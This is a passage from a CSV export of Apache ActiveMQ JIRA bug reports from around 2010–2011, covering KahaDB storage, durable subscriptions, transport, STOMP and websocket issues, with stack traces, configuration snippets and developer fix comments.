error.",,jijwang,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14737,,,Tue Nov 23 19:22:10 UTC 2010,,,,,,,,,,,"0|i0b9tr:",63704,,,,,,,,,,,,,,,,,,,,,"18/Oct/10 09:29;gtully;resolved in r1023704 ;;;","19/Oct/10 12:23;gtully;TODO: A jdbc variant of the test would be a nice addition.;;;","21/Oct/10 11:01;gtully;jdbc variant of test complete. (showed up issue with cleanup task not respecting priority) resolved in r1025939;;;","10/Nov/10 13:43;gtully;found another variant of the test that fails;;;","10/Nov/10 16:46;gtully;Issue sorted in r1033581 new test now enabled. detail in svn record;;;","12/Nov/10 19:17;jijwang;I just tried on Nov 12th SNAPSHOT build. It now will receive the same message more than once. For example, I have some durable message sent out every 20 minutes. A client may receive accumulated durable message 3-7 when it first reconnects. Then the client disconnected. After more than 20 minutes, it reconnected second time and received message 8. It then disconnected again. After another 20 more minutes, it reconnected the third time, but this time, it received message 3-9. So message 3-8 were delivered with duplicate.

I have the following configuration for AMQ broker:
<destinationPolicy>
            <policyMap>
              <policyEntries>
                <policyEntry topic="">"" producerFlowControl=""false"" memoryLimit=""1mb"">
                  <pendingSubscriberPolicy>
                    <fileCursor />
                  </pendingSubscriberPolicy>
                </policyEntry>
                <policyEntry queue="">"" producerFlowControl=""false"" memoryLimit=""1mb"">
                </policyEntry>
              </policyEntries>
            </policyMap>
        </destinationPolicy> 
 ...
        <systemUsage>
            <systemUsage sendFailIfNoSpaceAfterTimeout=""3000"">
                <memoryUsage>
                    <memoryUsage limit=""20 mb""/>
                </memoryUsage>
            </systemUsage>
        </systemUsage>


;;;","12/Nov/10 21:07;gtully;thanks for the feedback. Do you think you could reproduce your scenario with some variation of http://svn.apache.org/viewvc/activemq/trunk/activemq-core/src/test/java/org/apache/activemq/usecases/DurableSubscriptionOfflineTest.java?view=markup - a test case would be a great help.;;;","13/Nov/10 02:00;jijwang;Gary:

Please see some broker configuration in my previous post. In our test case, each client did a durable subscription with selector using sql like criteria, for example: (bs LIKE '%!10!%') OR (bs LIKE '%!20!%') .... OR (bs LIKE '%!100!%') The TopicConnection is nonTransactioned and with Session.AUTO_ACKNOWLEDGE. The message is sent with a possible string property of 'bs'. Its value could be something like !20!30!40!. The message was sent every 20 minutes. Then the client connects and reconnects from time to time.

 
;;;","23/Nov/10 15:25;gtully;It is possible to receive duplicates when the messageOrdercursor reverts back to the start when there are no new messages. 
With priority in the mix, the last ack location needs to include priority such that it can reset just the correct cursors.;;;","23/Nov/10 19:22;gtully;r1038276 - ackLocations are created on message send, such that subs can ack at their will, due to unmatched or out of order due to priority. subscription acks hold priority along with the last ack, such that the order cursors can be correctly chosen after a restart or reset. This ensures that duplicates are not dispatched as the current position is now ack aware rather than shared across priority.
This brings kahaDb more in line with JDBC w.r.t priority and durable subs. Tests now work with both stores.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Sticky KahaDB log files due to concurrent consumer with local transaction,AMQ-2983,12483802,12483957,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,moczarski,moczarski,17/Oct/10 20:13,27/Oct/10 14:11,14/Jul/23 05:43,27/Oct/10 09:16,5.4.1,,,,,5.4.2,,,Message Store,,,,1,,,,,,,,,"Concurrent consumer with local transactional session and session.receive() leads to KahaDB log files which won't be deleted even if there are no messages which are referred by the log file.

Please, see the attached test case. If only one consumer is configured it seems to work, but with more than one concurrent consumer the test fails.","Ubuntu 10.04, Java 1.6 
Mac OS X 10.5, Java 1.6.0_20",tranchida,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Oct/10 20:17;moczarski;AMQ2983Test.patch;https://issues.apache.org/jira/secure/attachment/12461824/AMQ2983Test.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14752,,,Wed Oct 27 09:16:18 UTC 2010,,,,,,,,,,,"0|i0b9qn:",63690,,,,,,,,,,,,,,,,,,,,,"27/Oct/10 09:16;dejanb;Fixed with svn revision 1027863. Thanks for the test case;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Sticky KahaDB log files due to local transaction rollback,AMQ-2982,12483803,12483957,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,moczarski,moczarski,17/Oct/10 19:25,27/Oct/10 14:11,14/Jul/23 05:43,26/Oct/10 10:34,5.4.1,,,,,5.4.2,,,Message Store,,,,1,,,,,,,,,On a rollback of a local transaction the transaction won't be removed from the inflight transaction list of the KahaDB MessageDatabase. This leads to KahaDB log files which won't be deleted even if there are no messages which are referred by the log file.,"Ubuntu 10.04, Java 1.6
Mac OS X 10.5, Java 1.6.0_20",tranchida,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Oct/10 19:49;moczarski;AMQ2982Fix.patch;https://issues.apache.org/jira/secure/attachment/12461823/AMQ2982Fix.patch","17/Oct/10 19:49;moczarski;AMQ2982Test.patch;https://issues.apache.org/jira/secure/attachment/12461822/AMQ2982Test.patch",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14742,,,Tue Oct 26 10:34:57 UTC 2010,,,,,,,Patch Available,,,,"0|i0b9qv:",63691,,,,,,,,,,,,,,,,,,,,,"17/Oct/10 19:49;moczarski;Test case and fix are attached. I would be glad if someone could review if the patch makes sense.;;;","26/Oct/10 10:34;dejanb;Fixed with svn revision 1027453. Thanks for the patch!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Connecting to broker using discovery protocol fails,AMQ-2981,12483499,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,justayogi,justayogi,15/Oct/10 12:55,02/Mar/11 12:35,14/Jul/23 05:43,02/Mar/11 12:35,5.4.0,5.4.1,,,,5.5.0,,,Transport,,,,1,,,,,,,,,"steps to reproduce

1. have a broker running on a port say '12345' and group say 'test' using activemq-core version 5.4.0 or 5.4.1
2.  use url 
discovery:(multicast://default?group=test)?reconnectDelay=1000&maxReconnectAttempts=30&useExponentialBackOff=false 
to connect to the broker
3. the following exception occurs



Caused by: javax.jms.JMSException: Invalid connect parameters: {reconnectDelay=1000, maxReconnectAttempts=30, useExponentialBackOff=false}
	at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:62)
	at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1298)
	at org.apache.activemq.ActiveMQConnection.ensureConnectionInfoSent(ActiveMQConnection.java:1382)
	at org.apache.activemq.ActiveMQConnection.createSession(ActiveMQConnection.java:309)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at org.springframework.jms.connection.SingleConnectionFactory$SharedConnectionInvocationHandler.invoke(SingleConnectionFactory.java:550)
	at $Proxy34.createSession(Unknown Source)
	at org.springframework.jms.support.JmsAccessor.createSession(JmsAccessor.java:196)
	at org.springframework.jms.core.JmsTemplate.execute(JmsTemplate.java:457)
	... 38 more
Caused by: java.io.IOException: Invalid connect parameters: {reconnectDelay=1000, maxReconnectAttempts=30, useExponentialBackOff=false}
	at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:45)
	at org.apache.activemq.transport.failover.FailoverTransport.oneway(FailoverTransport.java:594)
	at org.apache.activemq.transport.TransportFilter.oneway(TransportFilter.java:85)
	at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40)
	at org.apache.activemq.transport.ResponseCorrelator.asyncRequest(ResponseCorrelator.java:81)
	at org.apache.activemq.transport.ResponseCorrelator.request(ResponseCorrelator.java:86)
	at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1276)
	... 48 more
Caused by: java.lang.IllegalArgumentException: Invalid connect parameters: {reconnectDelay=1000, maxReconnectAttempts=30, useExponentialBackOff=false}
	at org.apache.activemq.transport.TransportFactory.doCompositeConnect(TransportFactory.java:159)
	at org.apache.activemq.transport.TransportFactory.compositeConnect(TransportFactory.java:93)
	at org.apache.activemq.transport.failover.FailoverTransport.doReconnect(FailoverTransport.java:844)
	at org.apache.activemq.transport.failover.FailoverTransport$2.iterate(FailoverTransport.java:135)
	at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
	at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:619)


4. downgrading to amq 5.3.2 solves the problem

NOTE: a new functionality has been added to 5.4.0 

ref : http://activemq.apache.org/discovery-transport-reference.html

Applying parameters to discovered transports
From 5.4, transport parameters in the URI will also be applied to discovered transports. Therefore, transport parameters may also include parameters for the discovered transport. For example, adding the connectionTimeout parameter to the URI will apply the parameter to every discovered TCP transport, even though this parameter is not a Discovery transport option.


I think the above change has caused the problem






","embedded activemq in tomcat
spring jms for connection pooling and connections",justayogi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14654,,,Wed Mar 02 12:35:05 UTC 2011,,,,,,,,,,,"0|i0akbr:",59566,,,,,,,,,,,,,,,,,,,,,"28/Feb/11 17:01;dejanb;Using the following URI

discovery:(multicast://default?group=test&reconnectDelay=1000&maxReconnectAttempts=30&useExponentialBackOff=false

with reconnection params in the inner URI works. We need to change the docs for this;;;","02/Mar/11 12:26;dejanb;After a bit more investigation, it seems that this is regression of https://issues.apache.org/jira/browse/AMQ-2849;;;","02/Mar/11 12:35;dejanb;Fixed with svn revision 1076192;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Seeing inflight messages that are not consumed when jmsPriority is enabled and have intermittent durable consumer,AMQ-2980,12483867,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,15/Oct/10 12:23,10/Nov/10 17:46,14/Jul/23 05:43,10/Nov/10 17:46,5.4.1,,,,,5.4.2,,,Broker,,,,0,,,,,,,,,"With reconnecting durable subs or with small prefetch, out of order priority messages and missing messages can occur. Issues with the kahaDB topic store, message delete and ordered cursor sync and replay.

Topic store sd.orderIndex need an exclusive lock and replay from the last ack needs to take ordered cursors into account. Batch replay also needs to maintain ordered cursor state between batches.

JDBC store also has some issues in the batch regard.",,jjordan,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14758,,,Wed Nov 10 17:46:02 UTC 2010,,,,,,,,,,,"0|i0b9wv:",63718,,,,,,,,,,,,,,,,,,,,,"15/Oct/10 12:31;gtully;Fix for KahaDB and test case in r1022890

JDBC store needs some work also.;;;","21/Oct/10 11:00;gtully;fix for jdbc in r1025939;;;","04/Nov/10 13:19;gtully;Further tests and improvements in r1030928 - additional rows in ack table to track last ack location per priority such that the store can be traversed in both directions to retrieve messages.;;;","10/Nov/10 13:29;gtully;reopening pending finding root cause of some duplicate dispatch on durable reconnect;;;","10/Nov/10 17:46;gtully;final piece in r1033607, contention over activation and dispatch resulted in the occasional dups on reconnect. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
New shell scripts doesn't work well with multiple broker instances,AMQ-2975,12483484,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,14/Oct/10 09:46,14/Oct/10 12:06,14/Jul/23 05:43,14/Oct/10 12:06,5.4.1,,,,,5.4.2,,,,,,,0,,,,,,,,,"1) Create the instances:

$ cd /home/phil/apache-activemq-5.4.1

$ bin/activemq create broker1
$ bin/activemq setup ~/.activemqrc-instance-broker1
$ ln -s activemq bin/activemq-instance-broker1

$ bin/activemq create broker2
$ bin/activemq setup ~/.activemqrc-instance-broker2
$ ln -s activemq bin/activemq-instance-broker2

2) set unique ports for the instances in their conf/activemq.xml and conf/jetty.xml files as shown below:

$ grep 16  broker[12]/conf/*.xml
broker1/conf/activemq.xml:            <transportConnector name=""openwire"" uri=""tcp://0.0.0.0:61616""/>
broker1/conf/jetty.xml:                    <property name=""port"" value=""8161"" />
broker2/conf/activemq.xml:            <transportConnector name=""openwire"" uri=""tcp://0.0.0.0:61626""/>
broker2/conf/jetty.xml:                    <property name=""port"" value=""8162"" />

When I try to start both brokers, I get a ""Process with pid XXX is already running"" message.  This is due to the pid file being created in $ACTIVEMQ_HOME/data rather than the instance's $ACTIVEMQ_BASE/data directory",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14835,,,Thu Oct 14 12:06:26 UTC 2010,,,,,,,,,,,"0|i0b9o7:",63679,,,,,,,,,,,,,,,,,,,,,"14/Oct/10 12:06;dejanb;Fixed with svn revision 1022475;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Set ClientID - InvalidClientIDException with stomp,AMQ-2974,12483510,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,ons,ons,13/Oct/10 16:00,20/Sep/11 10:42,14/Jul/23 05:43,13/Aug/11 22:44,5.4.0,5.4.1,,,,5.6.0,,,Connector,,,,1,,,,,,,,,"We are using the NMS stomp-client to communicate with ActiveMQ. Our Stomp-Clients are mobile devices connected via GSM and loose the connection from time to time. Therefore we are using durable subscriptions and the clients use a fixed but unique Client-ID. When they loose the connection they can't reconnect because the server doesn't release the (failed) connection.

The server log looks like this:
INFO  | Transport failed: java.io.IOException: Broker: localhost - Client: client1 already connected from /xxx.xxx.xxx.xxx:yyyyy | org.apache.activemq.broker.TransportConnection.Transport | ActiveMQ Transport: tcp:///xxx.xxx.xxx.xxx:yyyyy
java.io.IOException: Broker: localhost - Client: client1 already connected from /xxx.xxx.xxx.xxx:zzzzz
        at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:39)
        at org.apache.activemq.transport.stomp.ProtocolConverter$2.onResponse(ProtocolConverter.java:510)
        at org.apache.activemq.transport.stomp.ProtocolConverter.onActiveMQCommand(ProtocolConverter.java:579)
        at org.apache.activemq.transport.stomp.StompTransportFilter.oneway(StompTransportFilter.java:58)
        at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40)
        at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1247)
        at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:808)
        at org.apache.activemq.broker.TransportConnection.dispatchSync(TransportConnection.java:768)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:187)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
        at org.apache.activemq.transport.stomp.StompTransportFilter.sendToActiveMQ(StompTransportFilter.java:81)
        at org.apache.activemq.transport.stomp.ProtocolConverter.sendToActiveMQ(ProtocolConverter.java:140)
        at org.apache.activemq.transport.stomp.ProtocolConverter.onStompConnect(ProtocolConverter.java:503)
        at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:192)
        at org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:70)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:219)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:201)
        at java.lang.Thread.run(Thread.java:636)
Caused by: javax.jms.InvalidClientIDException: Broker: localhost - Client: client1 already connected from /xxx.xxx.xxx.xxx:yyyyy
        at org.apache.activemq.broker.region.RegionBroker.addConnection(RegionBroker.java:242)
        at org.apache.activemq.broker.BrokerFilter.addConnection(BrokerFilter.java:85)
        at org.apache.activemq.broker.BrokerFilter.addConnection(BrokerFilter.java:85)
        at org.apache.activemq.advisory.AdvisoryBroker.addConnection(AdvisoryBroker.java:78)
        at org.apache.activemq.broker.BrokerFilter.addConnection(BrokerFilter.java:85)
        at org.apache.activemq.broker.BrokerFilter.addConnection(BrokerFilter.java:85)
        at org.apache.activemq.broker.MutableBrokerFilter.addConnection(MutableBrokerFilter.java:91)
        at org.apache.activemq.broker.TransportConnection.processAddConnection(TransportConnection.java:694)
        at org.apache.activemq.broker.jmx.ManagedTransportConnection.processAddConnection(ManagedTransportConnection.java:83)
        at org.apache.activemq.command.ConnectionInfo.visit(ConnectionInfo.java:137)
        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:309)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:185)
        ... 10 more

At the same time the NMS-Client logs the following:
StompWireFormat - Received ERROR command: Broker: localhost - Client: client1 already connected from /xxx.xxx.xxx.xxx:yyyyy

The connection is not being released even after more than 10 minutes. I have to restart the ActiveMQ server to be able to reconnect earlier.

For me it looks quite similar to the following Issue: https://issues.apache.org/activemq/browse/AMQ-2831",,jigneshb,ons,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Oct/10 07:23;ons;MQAlreadyConnectedTest.cs;https://issues.apache.org/jira/secure/attachment/12461825/MQAlreadyConnectedTest.cs",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,60088,,,Sat Aug 13 22:44:21 UTC 2011,,,,,,,,,,,"0|i0agyv:",59022,,,,,,,,,,,,,,,,,,,,,"19/Oct/10 07:23;ons;Added a test case to demonstrate the problem;;;","03/Feb/11 01:22;jigneshb;This is exactly what we are experiencing. We are using mobile devices to connect to ActiveMQ broker using STOMP (1.5.1) and the same result. This also affects ActiveMQ version 5.4.2.;;;","29/Jun/11 22:47;tabish;ActiveMQ 5.x implements Stomp 1.0 which has no heartbeat mechanism to detect that a client connection has dropped.  In the event that the socket drop is not detected then the tcp keepalive won't kick in for up to two hours which is why you would see an error like this.  From the brokers point of view the connection appears valid an the subscriber is assumed to still be connected.;;;","14/Jul/11 19:17;artnaseef;NMS is creating a new client ID every time a connection is created, right?  In which case, a timeout on the broker wouldn't matter.

We're seeing this problem without the failover transport - just a straight ssl://.... connection.  The connection is created once and used to create multiple sessions in separate threads, then the problem occurs.;;;","14/Jul/11 19:29;tabish;The issue reports the error in relation to durable subscribers which requires that the client reconnect with same client id and subscribe to the same subscription id which is what my comment was referencing.  If you are experiencing something like this without durable subscribers then there could also be some other issue at play.

You best bet as always to get a quick resolution is to create a unit test that can reproduce the problem so we can debug it.  ;;;","13/Aug/11 22:44;tabish;Fixed by use of Stomp v1.1 client with heartbeats (AMQ-3449) and also with improvements made in AMQ-3442;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Removing composite subscription clears all dispatched messages,AMQ-2973,12483474,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,12/Oct/10 13:22,12/Oct/10 13:31,14/Jul/23 05:43,12/Oct/10 13:31,5.4.1,,,,,5.4.2,,,,,,,0,,,,,,,,,"When removing subscription on a composite destination, the removal of the first destination dispatched messages will clear the list, so subsequent destinations won't redeliver their messages.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14831,,,Tue Oct 12 13:31:17 UTC 2010,,,,,,,,,,,"0|i0b9yv:",63727,,,,,,,,,,,,,,,,,,,,,"12/Oct/10 13:31;dejanb;fixed with svn revision 1021768;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
STOMP over Websockets do not work in Chrome,AMQ-2972,12483502,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,bergamot,bergamot,12/Oct/10 07:52,18/Oct/10 07:15,14/Jul/23 05:43,13/Oct/10 08:52,5.4.1,,,,,5.4.2,,,Transport,,,,0,,,,,,,,,"The STOMP over Websocket support does not work with both client libraries referenced from the ActiveMQ Websockets page
( http://activemq.apache.org/websockets.html ).
On the ActiveMQ side, the following error appears:

 INFO | Started SelectChannelConnector@0.0.0.0:8161
ERROR | handle failed?
java.lang.IllegalArgumentException: !utf8
        at org.eclipse.jetty.util.Utf8StringBuilder.append(Utf8StringBuilder.java:112)
        at org.eclipse.jetty.websocket.WebSocketParser.parseNext(WebSocketParser.java:147)
        at org.eclipse.jetty.websocket.WebSocketConnection.handle(WebSocketConnection.java:75)
        at org.eclipse.jetty.server.bio.SocketConnector$ConnectorEndPoint.run(SocketConnector.java:252)
        at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:436)
        at java.lang.Thread.run(Unknown Source)
","Windows XP, Chrome 6.0.472.63",bergamot,julian.cable,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14833,,,Mon Oct 18 07:15:12 UTC 2010,,,,,,,,,,,"0|i0b9xr:",63722,,,,,,,,,,,,,,,,,,,,,"12/Oct/10 08:58;bergamot;I've managed to solve the issue by upgrading the jetty components to version 7.1.6
So, in lib/web, I updated jetty-all-server-7.0.1.v20091125.jar to jetty-all-server-7.1.6.v20100715.jar
and jetty-websocket-7.0.1.v20091125.jar to jetty-websocket-7.1.6.v20100715.jar.

Probably the websocket specification has changed between jetty releases.

Also, some extra documentation on how to use the client libraries specifically for ActiveMQ would be handy.
It took some time for me to find out that the destination should be in the form ""/topic/test.topic"" or ""/queue/test.queue"".;;;","13/Oct/10 08:52;dejanb;fixed with svn revision 1022029. Thanks for digging this out.;;;","16/Oct/10 03:16;julian.cable;Using apache-activemq-5.4.0-fuse-00-00

I tried updating the jetty jars and got:

ERROR: java.lang.RuntimeException: Failed to execute start task. Reason: org.springframework.beans.factory.BeanDefinitionStoreException: Failed to load type: org.eclipse.jetty.security.HashLoginService. Reason: java.lang.ClassNotFoundException: org.eclipse.jetty.security.HashLoginService; nested exception is java.lang.ClassNotFoundException: org.eclipse.jetty.security.HashLoginService

I tried adding jetty-security-7.1.6.v20100715.jar but that didn't help.;;;","18/Oct/10 07:15;bergamot;The jetty-all-server jar is an aggregate jar that contains org.eclipse.jetty.security.HashLoginService. Maybe your classpath is non-standard or there's a difference between ActiveMQ 5.4.1 and Fuse 5.4.0?;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
DestinationStatistics.getMessages() returns 0 after reset with messages still in queue,AMQ-2971,12483471,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,bpd@keynetics.com,bpd@keynetics.com,11/Oct/10 18:37,30/Jul/12 17:58,14/Jul/23 05:43,20/Jul/11 20:03,5.3.0,5.3.1,5.3.2,5.4.0,5.4.1,5.6.0,,,JMX,,,,0,,,,,,,,,"A call to org.apache.activemq.broker.jmx.DestinationView.resetStatistics() is implemented as a call to org.apache.activemq.broker.region.DestinationStatistics.reset(). This call sets the DestinationStatistics.messages counter to 0 even if there are messages currently in the queue.

This is functionally the same issue that was resolved for the ""producers"" and ""consumers"" counters in AMQ-1946.

The fix should be as easy as setting the doReset to false for the messages counter.
{code}
messages.setDoReset(false); 
{code}",,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3952,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,60071,,,Wed Jul 20 20:03:28 UTC 2011,,,,,,,,,,,"0|i0akbz:",59567,,,,,,,,,,,,,,,,,,,,,"20/Jul/11 20:03;tabish;Find in trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
